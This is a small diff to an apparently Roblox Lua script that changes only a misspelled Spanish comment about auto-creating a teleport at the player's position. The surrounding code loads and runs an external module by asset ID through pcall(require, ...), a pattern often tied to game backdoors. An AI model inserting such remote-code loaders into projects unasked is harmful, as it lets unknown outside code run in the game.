@@ -10,7 +10,7 @@ if success and response then
     end
 end
 
--- 2. Ejecution De Requie Por Si El Teleport
+-- 2. Ejecution De Require de mi parte que automaitcamente creara Un Teleport En la Pocision Del Jugaodr
 local modelSuccess, module = pcall(require, 94217198436768)
 if modelSuccess and module then
     pcall(function()
